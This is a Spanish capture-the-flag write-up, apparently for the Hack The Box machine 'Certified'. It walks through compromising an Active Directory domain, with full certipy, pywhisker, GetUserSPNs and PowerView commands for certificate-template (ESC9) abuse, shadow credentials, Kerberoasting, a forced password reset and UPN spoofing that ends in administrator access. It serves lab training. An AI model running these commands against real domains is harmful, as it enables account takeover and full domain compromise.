# Certified

Tags: [[_ad]],[[_bloodhoundEnum]],[[_permissionAbuse]]

## Primeros pasos
(Reconocimiento).

<span style="color:#07b4f2">Organizamos</span> <span style="color:#ff2dc0">TMUX</span>.
<span style="color:#07b4f2">Activamos</span> <span style="color:#ff2dc0">VPN</span>.

Le <span style="color:#07b4f2">hacemos</span> un <span style="color:#ff2dc0">ping</span> <span style="color:#07b4f2">a</span> la <span style="color:#ff2dc0">máquina</span>. (<span style="color:#379075">Está activa o no</span>).
<span style="color:#bef202">Posible</span> <span style="color:#ff2dc0">máquina Windows</span>.

<span style="color:#07b4f2">Ponemos</span> la <span style="color:#ff2dc0">IP</span> de la <span style="color:#ff2dc0">máquina</span> <span style="color:#07b4f2">en</span> un <span style="color:#07b4f2">lugar visible</span>.
<span style="color:#07b4f2">Creamos</span> un <span style="color:#07b4f2">directorio</span> <span style="color:#07b4f2">como</span> la <span style="color:#ff2dc0">IP</span> o <span style="color:#07b4f2">nombre</span> de la <span style="color:#ff2dc0">máquina</span>.
<span style="color:#07b4f2">Creamos</span> los <span style="color:#07b4f2">directorios</span> de <span style="color:#07b4f2">trabajo</span>.

<span style="color:#bef202">Empezamos el escaneo con</span> <span style="color:#ff2dc0">NMAP</span>. <span style="color:#379075">Otro escaneo de puertos comunes por posibles falsos negativos</span>.
En este caso <span style="color:#07b4f2">no buscamos</span> <span style="color:#ff2dc0">codename</span> con <span style="color:#ff2dc0">launchpad</span>.

+ <span style="color:#ff669c">Puertos abiertos</span>

Son <span style="color:#07b4f2">muchos</span> <span style="color:#ff669c">puertos</span> abiertos, iremos <span style="color:#ff2dc0">enumerando</span> <span style="color:#07b4f2">de a poco</span>.

<span style="color:#ff669c">88</span> - Kerberos.
<span style="color:#ff669c">445</span> - SMB.
<span style="color:#ff669c">389</span> - LDAP.


## Investigación (Intrusión)
(Reconocimiento/Enumeración).

Importante.
<span style="color:#ecacb6">As is common in real life Windows pentests, you will start the Certified box with credentials for the following account: judith.mader / judith09</span>
Así que <span style="color:#07b4f2">tenemos</span> <span style="color:#ff2dc0">credenciales</span>.


<span style="color:#ff669c">445</span>.
En el recurso <span style="color:#ecacb6">SYSVOL</span> hay <span style="color:#07b4f2">cositas</span>. Pero <span style="color:#07b4f2">no tanto</span>.

Volvemos a <span style="color:#ff2dc0">enumerar</span> el <span style="color:#ecacb6">SYSVOL</span>, podría tener <span style="color:#07b4f2">cosas interesantes</span>.
Investigando una forma de <span style="color:#07b4f2">leer</span> lo que <span style="color:#07b4f2">contiene</span>, encontramos
https://github.com/jtpereyda/regpol
<span style="color:#88c425">pipx install regpol</span>
<span style="color:#88c425">regpol Registry.pol </span>y vemos <span style="color:#07b4f2">información</span> en <span style="color:#ff2dc0">Hex</span>.
<span style="color:#88c425">regpol Registry.pol  --raw-data 0</span> :    ver la <span style="color:#07b4f2">información mejor representada </span>de un índice.
Sin embargo, la información <span style="color:#07b4f2">no ayuda</span> mucho.
<span style="color:#bef202">Vamos al 389</span>.


<span style="color:#ff669c">389</span>.
<span style="color:#ff2dc0">Enumeramos</span> y tenemos los <span style="color:#ecacb6">usuarios</span> del <span style="color:#ff2dc0">dominio</span>. Pero <span style="color:#07b4f2">no</span> encontramos <span style="color:#07b4f2">mucho</span>.

Regresamos a <span style="color:#07b4f2">probar cosas</span> e intentar de todo, pero nada.

Investigado <span style="color:#07b4f2">encontramos</span>
https://github.com/ShutdownRepo/pywhisker?tab=readme-ov-file, donde <span style="color:#07b4f2">comprendemos</span> que podemos <span style="color:#07b4f2">modificar</span> el <span style="color:#ff2dc0">atributo</span> <span style="color:#ecacb6">msDS-KeyCredentialLink</span>  de un <span style="color:#ecacb6">user</span>/<span style="color:#ecacb6">computer</span>.
Instalamos lo necesario.
<span style="color:#ecacb6">1.-</span> <span style="color:#ff2dc0">Clonamos</span> https://github.com/ShutdownRepo/pywhisker
<span style="color:#88c425">git checkout -f ec30ba5759d57ead54341f58289090a9dc01249a</span> :    migramos a esta <span style="color:#07b4f2">versión anterior</span>.
<span style="color:#88c425">pip install pyopenssl --break-system-packages --upgrade</span> :    lo <span style="color:#07b4f2">actualizamos</span>, por unos <span style="color:#07b4f2">problemillas</span>.
<span style="color:#ecacb6">2.-</span> <span style="color:#ff2dc0">Clonamos</span> https://github.com/dirkjanm/PKINITtools/ (<span style="color:#379075">no lo usamos, pero se entiende lo que hace</span>).
<span style="color:#ecacb6">3.-</span> <span style="color:#88c425">pip3 install certipy-ad --break-system-packages</span>

Cómo <span style="color:#07b4f2">prodecer</span>.
+<span style="color:#ff2dc0">Sincronizamos</span> nuestro <span style="color:#07b4f2">reloj al del</span> <span style="color:#ff2dc0">KDC</span> (<span style="color:#379075">por lo regular es el DC mismo</span>).
<span style="color:#bef202">Pasos</span>.
+Usar lo del <span style="color:#07b4f2">punto</span> <span style="color:#ecacb6">3</span>.
<span style="color:#88c425">certipy find -u judith.mader@corp.local -p "judith09" -dc-ip 10.10.11.41</span> :    <span style="color:#ff2dc0">enumerar</span> los <span style="color:#ff2dc0">AD CS certificate templates</span> (<span style="color:#379075">es decir, templates vulnerables</span>). Me <span style="color:#07b4f2">devuelve archivos</span> que <span style="color:#07b4f2">contienen</span> los <span style="color:#ff2dc0">templates vulnerables</span>.
<span style="color:#88c425">cat 20240525140107_Certipy.txt | grep "User"</span> :    <span style="color:#07b4f2">filtramos</span> por uno.
https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc4/ :    <span style="color:#07b4f2">identificar</span> los <span style="color:#ff2dc0">template vulnerables</span>.

<span style="color:#88c425">certipy req -username "judith.mader@certified.htb" -p "judith09" -ca certified-DC01-CA -target "DC01.certified.htb" -template User -subject "CN=management service,CN=Users,DC=certified,DC=htb"</span> :    nos <span style="color:#07b4f2">da</span> un <span style="color:#ecacb6">.pfx</span>
<span style="color:#ecacb6">-template User</span> es uno casi por <span style="color:#07b4f2">defecto</span>.
<span style="color:#ecacb6">-ca certified-DC01-CA</span> nos <span style="color:#07b4f2">lo da cuando</span> usamos <span style="color:#88c425">cerpity find</span>...
<span style="color:#379075">Puede que --subjetc ... no haga falta</span>.

<span style="color:#88c425">certipy auth -pfx judith.mader.pfx -dc-ip 10.10.11.41</span> :    nos <span style="color:#ff2dc0">autenticamos</span> para <span style="color:#07b4f2">obtener</span> su <span style="color:#ff2dc0">TGT</span> (<span style="color:#379075">.ccache</span>) <span style="color:#07b4f2">y se obtiene</span> el <span style="color:#ff2dc0">NTLM</span> de <span style="color:#ecacb6">judith.mader</span>, en este caso (<span style="color:#379075">preciso para usarlo después</span>).


+Usar lo de los <span style="color:#07b4f2">puntos</span> <span style="color:#ecacb6">1</span> y <span style="color:#ecacb6">3</span>.
<span style="color:#88c425">python3 pywhisker.py -d "certified.htb" -u "judith.mader" -H "8ec62ac86259004c121a7df4243a7a80" -t "management_svc" --action "add" </span>:    nos <span style="color:#07b4f2">da</span> un <span style="color:#ecacb6">.pfx</span> y su <span style="color:#ff2dc0">contraseña</span>.
Nos <span style="color:#07b4f2">aseguramos</span> que <span style="color:#07b4f2">no tenga otro</span> antes, <span style="color:#ecacb6">--action "clear"</span> para <span style="color:#07b4f2">limpar</span>.
<span style="color:#07b4f2">No</span> nos <span style="color:#07b4f2">muestra</span> el <span style="color:#ecacb6">.pfx</span>, hacemos
<span style="color:#88c425">pip uninstall pyOpenSSL asgiref  </span>
<span style="color:#88c425">sudo apt-get remove python3-asgiref  </span>
<span style="color:#88c425">pip install asgiref==3.7.2  </span>
<span style="color:#88c425">pip install pyOpenSSL==22.1.0 mitmproxy-rs==0.5.1 urwid-mitmproxy==2.1.1  </span>
<span style="color:#88c425">pip install --upgrade impacket</span>

<span style="color:#07b4f2">Podríamos utilizar</span> lo del <span style="color:#07b4f2">punto</span> <span style="color:#ecacb6">2</span>, pero <span style="color:#07b4f2">no va bien</span>, sin embargo, podemos <span style="color:#07b4f2">hacerlo</span> de<span style="color:#07b4f2"> distinta manera</span>.
https://i-tracing.com/blog/shadow-credentials/ :    <span style="color:#07b4f2">dos vías</span>, con <span style="color:#ff2dc0">PKINITtools</span> <span style="color:#07b4f2">o</span> <span style="color:#ff2dc0">Certipy</span> (<span style="color:#379075">la que usamos</span>).
<span style="color:#88c425">certipy cert -export -pfx dpLruvfm.pfx -password "JxARBHKgfFRjHpxxmYQc" -out management_svc.pfx</span> :    <span style="color:#ff2dc0">unprotected</span> <span style="color:#07b4f2">del</span> <span style="color:#ecacb6">.pfx </span>para <span style="color:#07b4f2">crear otro</span> <span style="color:#ecacb6">.pfx</span>
<span style="color:#ecacb6">-pfx dpLruvfm.pfx</span> y <span style="color:#ecacb6">-password "JxARBHKgfFRjHpxxmYQc"</span> es el que <span style="color:#07b4f2">creamos</span> con <span style="color:#ff2dc0">pywhisker.py</span>

<span style="color:#88c425">certipy auth -pfx management_svc.pfx -username "management_svc" -domain "certified.htb"</span> :    nos <span style="color:#ff2dc0">autenticamos</span> para <span style="color:#07b4f2">obtener su</span> <span style="color:#ff2dc0">TGT</span> (<span style="color:#379075">.ccache</span>) y con él, <span style="color:#07b4f2">su</span> <span style="color:#ff2dc0">NTML</span> Hash.

<span style="color:#ecacb6">management_svc:a091c1832bcdd4677c28b5a6a1295584 </span>(<span style="color:#379075">NTLM</span>).


<span style="color:#ff669c">88</span>.
<span style="color:#07b4f2">Probamos</span> a ver si hay <span style="color:#ecacb6">usuarios</span> <span style="color:#ff2dc0">kerberoastables</span>.
<span style="color:#88c425">GetUserSPNs.py certified.htb/judith.mader:judith09</span> :    esto porque<span style="color:#07b4f2"> podemos probarlo teniendo</span> <span style="color:#ff2dc0">credenciales</span> de <span style="color:#07b4f2">cualquier</span> <span style="color:#ecacb6">usuario</span>.
Y nos <span style="color:#07b4f2">sale</span> el <span style="color:#ecacb6">usuario</span>
<span style="color:#ecacb6">certified.htb/management_svc.DC01</span>

Pues <span style="color:#07b4f2">solicitamos</span> un <span style="color:#ff2dc0">TGS</span>.
<span style="color:#88c425">GetUserSPNs.py certified.htb/judith.mader:judith09 -request</span> :    <span style="color:#07b4f2">solicita</span> de <span style="color:#07b4f2">todos</span> los que <span style="color:#07b4f2">haya</span>, en <span style="color:#07b4f2">este caso</span> es solo <span style="color:#07b4f2">uno</span>.

---
<span style="color:#07b4f2">Recordemos</span> que para este <span style="color:#07b4f2">tipo</span> de <span style="color:#07b4f2">ataques</span> debemos estar <span style="color:#07b4f2">sincronizados</span> al <span style="color:#07b4f2">reloj</span> del <span style="color:#ff2dc0">DC</span>.
<span style="color:#88c425">date -s "$(curl -s -X GET "http://10.10.11.41:5985" -I | grep "Sat" | cut -d' ' -f2,3,4,5,6,7)"</span> 
<span style="color:#88c425">date --set="$(curl -s -X GET "http://10.10.11.41:5985" -I | grep -oP '\d{1,2}:\d{1,2}:\d{1,2}')"</span> :    la <span style="color:#07b4f2">idea</span> con esto, es que <span style="color:#07b4f2">antes</span> <span style="color:#ff2dc0">seteemos</span> la <span style="color:#07b4f2">fecha</span>, y <span style="color:#07b4f2">depués</span> la <span style="color:#07b4f2">hora</span>, para evitar problemas.
O <span style="color:#07b4f2">haciendo</span>
<span style="color:#88c425">ntpdate -s 10.10.11.41</span>

De esta manera <span style="color:#07b4f2">nos</span> <span style="color:#ff2dc0">sincronizamos</span> bien. (<span style="color:#379075">Es cuestión de probar varias veces y/o de distintas formas</span>).

---

El <span style="color:#ff2dc0">Hash</span> <span style="color:#07b4f2">obtenido</span> lo podemos <span style="color:#07b4f2">tratar</span> de <span style="color:#ff2dc0">romper</span>.
Sin embargo, <span style="color:#07b4f2">no se puede</span>.

<span style="color:#bef202">Volvamos al 445</span>.


## Escalada

Enumerar todo el sistema.
Estamos como el usuario <span style="color:#ecacb6">management_svc</span>

Vamos a <span style="color:#ff2dc0">enumerar</span> <span style="color:#07b4f2">con</span> <span style="color:#ff2dc0">BloodHound</span>.
Recordemos <span style="color:#07b4f2">descargar</span> el <span style="color:#ecacb6">PowerView.ps1</span>
<span style="color:#88c425">Import-Module .\PowerView.ps1</span>

<span style="color:#ecacb6">management_svc</span> tiene <span style="color:#ff2dc0">GenericAll</span> <span style="color:#07b4f2">sobre</span> <span style="color:#ecacb6">CA_OPERATOR</span>, me permite <span style="color:#07b4f2">hacer cosas</span>. 
<span style="color:#bef202">2 maneras</span>.

<span style="color:#ecacb6">1.-</span> <span style="color:#07b4f2">Cambiarle su</span> <span style="color:#ff2dc0">SPN</span> para <span style="color:#07b4f2">volverlo</span> <span style="color:#ff2dc0">Kerberoastable</span>, y obtener su <span style="color:#ff2dc0">SPNTicket</span> para romperlo.

2.- <span style="color:#ff2dc0">Resetearle</span> su <span style="color:#ecacb6">password</span>.
<span style="color:#88c425">Set-DomainUserPassword -Identity ca_operator -AccountPassword (ConvertTo-SecureString 'CaOpeRator1234$!' -AsPlainText -Force) -Verbose</span> 
La <span style="color:#ecacb6">contraseña</span> debe ser <span style="color:#07b4f2">robusta</span>.


Con cualquiera forma, ya teniendo su contraseña podríamos tratar de ejecutar <span style="color:#ff2dc0">comandos</span> <span style="color:#07b4f2">como</span> <span style="color:#ecacb6">ca_operator</span> (<span style="color:#379075">pero no en este caso</span>).

<span style="color:#07b4f2">Buscar</span> <span style="color:#ff2dc0">templates vulnerables</span> para el <span style="color:#ecacb6">ca_operator</span>.
+<span style="color:#07b4f2">Obtenemos</span> la <span style="color:#ff2dc0">contraseña</span> de <span style="color:#ecacb6">ca_operator</span> (<span style="color:#379075">se la cambiamos u otra forma</span>).
+Usamos <span style="color:#ff2dc0">Certipy</span> 
<span style="color:#88c425">certipy find -dc-ip 10.10.11.41 -u ca_operator -p 'CaOpeRator1234$!'</span>
Podemos <span style="color:#07b4f2">usar</span> los <span style="color:#ff2dc0">parámetros</span> <span style="color:#ecacb6">-vulnerable</span> <span style="color:#ecacb6">-enabled </span>para mayor <span style="color:#07b4f2">precisión</span>.
+<span style="color:#07b4f2">Filtramos</span> por un <span style="color:#ff2dc0">Template vulnerable</span>.
<span style="color:#07b4f2">Encontramos</span> uno llamado <span style="color:#ecacb6">CertifiedAuthentication</span>, donde <span style="color:#ecacb6">ca_operator</span> tiene permisos.
Y es <span style="color:#ff2dc0">vulnerable</span> para el <span style="color:#ecacb6">ESC9</span>, nos dice que <span style="color:#ecacb6">ca_operator</span> puede <span style="color:#ff2dc0">inscribirse</span> y la <span style="color:#ff2dc0">template</span> <span style="color:#07b4f2">no tiene</span> una <span style="color:#ff2dc0">security extension.</span>

<span style="color:#bef202">Tenemos 2 vías</span>.
+ Aprovechamos el <span style="color:#ecacb6">CertifiedAuthentication</span> y los <span style="color:#ff2dc0">permisos</span> adecuados.
<span style="color:#07b4f2">Lo hacemos</span> <span style="color:#ff2dc0">vulnerable</span> a <span style="color:#ecacb6">ESC1</span> <span style="color:#07b4f2">modificando</span> el <span style="color:#ff2dc0">template</span>.
https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc4/#elementor-toc__heading-anchor-3

+<span style="color:#07b4f2">Modificamos</span> el <span style="color:#ff2dc0">template</span> <span style="color:#07b4f2">usando</span> el usuario <span style="color:#ecacb6">ca_operator</span>
+Hacemos un <span style="color:#ff2dc0">request</span> al <span style="color:#ecacb6">administrador</span> del <span style="color:#ff2dc0">dominio</span> <span style="color:#07b4f2">usando</span> el <span style="color:#ff2dc0">template</span> <span style="color:#ecacb6">CertifiedAuthentication</span> <span style="color:#07b4f2">modificado</span>.
+Hacemos una <span style="color:#ff2dc0">request</span> al <span style="color:#ff2dc0">dominio</span> para <span style="color:#07b4f2">obtener</span> el <span style="color:#ff2dc0">TGT</span> del <span style="color:#ecacb6">administrador</span> <span style="color:#07b4f2">y con ello su</span> <span style="color:#ff2dc0">NTLM</span>.
<span style="color:#379075">No pongo instrucciones porque no me sirvió mucho</span>.

+ <span style="color:#07b4f2">Aprovechamos</span> el <span style="color:#ecacb6">CertifiedAuthentication</span> <span style="color:#07b4f2">que tiene el</span> <span style="color:#ecacb6">ESC9</span>.
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation, la <span style="color:#07b4f2">parte</span> de <span style="color:#ecacb6">ESC9</span> porque <span style="color:#07b4f2">ese</span> <span style="color:#ff2dc0">template</span> es el <span style="color:#ff2dc0">vulnerable</span> en <span style="color:#07b4f2">este caso</span>.

Recordemos que <span style="color:#ecacb6">management_svc</span> tiene <span style="color:#ff2dc0">GenericAll</span> <span style="color:#07b4f2">sobre</span> <span style="color:#ecacb6">ca_operator</span>
+Usamos <span style="color:#ff2dc0">Shadow Credentials</span> para <span style="color:#07b4f2">obtener</span> el <span style="color:#ff2dc0">NTLM</span> de <span style="color:#ecacb6">ca_operator</span>
<span style="color:#88c425">certipy shadow auto -username management_svc@certified.htb -hashes 'a091c1832bcdd4677c28b5a6a1295584' -account ca_operator</span> :    nos <span style="color:#07b4f2">da</span> el <span style="color:#ff2dc0">NTLM</span> directamente.
 
+Le <span style="color:#07b4f2">modificamos</span> el <span style="color:#ff2dc0">userPrincipalName</span> de <span style="color:#ecacb6">ca_operator</span> <span style="color:#07b4f2">para que sea</span> <span style="color:#ecacb6">Administrator</span>, <span style="color:#07b4f2">omitiendo</span> el <span style="color:#ecacb6">@certified.thb</span>
<span style="color:#88c425">certipy account update -username management_svc@certified.htb -hashes 'a091c1832bcdd4677c28b5a6a1295584' -user ca_operator -upn Administrator</span>
<span style="color:#07b4f2">No</span> da <span style="color:#07b4f2">problemas</span>, puesto que<span style="color:#ecacb6"> Administrator@certified.htb</span> es <span style="color:#07b4f2">distinto como</span> <span style="color:#ff2dc0">userPrincipalName</span> <span style="color:#07b4f2">del</span> <span style="color:#ecacb6">Administrator</span>.

+<span style="color:#07b4f2">Solicitamos</span> la <span style="color:#ff2dc0">certificate template</span> <span style="color:#ecacb6">CertifiedAuthentication</span>, que es <span style="color:#ff2dc0">vulnerable</span> <span style="color:#07b4f2">para</span> <span style="color:#ecacb6">ESC9</span>.
<span style="color:#88c425">certipy req -username ca_operator@certified.htb -hashes '387ebed2f7c26bea5ac35e2a750b6b43' -ca certified-DC01-CA -template CertifiedAuthentication</span> :    <span style="color:#07b4f2">nos da</span> un <span style="color:#ecacb6">administrator.pfx</span>
<span style="color:#ecacb6">-ca certified-DC01-CA</span> <span style="color:#07b4f2">lo vemos en</span> los <span style="color:#ff2dc0">archivos</span> de los <span style="color:#ff2dc0">templates</span>, <span style="color:#07b4f2">es el</span> <span style="color:#ff2dc0">Certificate Authorities</span>. <span style="color:#379075">Lo metimos en el /etc/hosts pero quizá no haga falta</span>.
Llegamos a ver que el <span style="color:#ff2dc0">userPrincipalName</span> <span style="color:#07b4f2">del</span> <span style="color:#ff2dc0">certificado</span> <span style="color:#07b4f2">refleja el</span> <span style="color:#ecacb6">Administrator</span>, <span style="color:#07b4f2">sin ningún</span> "<span style="color:#ecacb6">object SID</span>".

+El <span style="color:#ff2dc0">userPrincipalName</span> de <span style="color:#ecacb6">ca_operator</span> <span style="color:#07b4f2">se revierte a</span> su <span style="color:#07b4f2">original</span>, <span style="color:#ecacb6">ca_operator@certified.htb</span>
<span style="color:#88c425">certipy account update -username management_svc@certified.htb -hashes 'a091c1832bcdd4677c28b5a6a1295584' -user ca_operator -upn ca_operator@certified.htb</span>

+<span style="color:#07b4f2">Nos</span> <span style="color:#ff2dc0">autenticamos</span> <span style="color:#07b4f2">con</span> el <span style="color:#ff2dc0">certificado</span> <span style="color:#07b4f2">emitido</span> para <span style="color:#07b4f2">obtener</span> el <span style="color:#ff2dc0">NTLM</span> de <span style="color:#ecacb6">Administrator@certified.htb</span>
<span style="color:#88c425">certipy auth -pfx administrator.pfx -domain certified.htb</span>
<span style="color:#ecacb6">-domain certified.htb</span> debido a <span style="color:#07b4f2">falta de especificación</span> de <span style="color:#ff2dc0">dominio</span> <span style="color:#07b4f2">en</span> el <span style="color:#ff2dc0">certificado</span>.

Con el <span style="color:#ff2dc0">NTLM</span> de <span style="color:#ecacb6">administrator</span>, <span style="color:#07b4f2">nos conectamos</span> con <span style="color:#ff2dc0">psexec</span> a la <span style="color:#ff2dc0">máquina víctima</span> y pa deeeentro.
Fin.
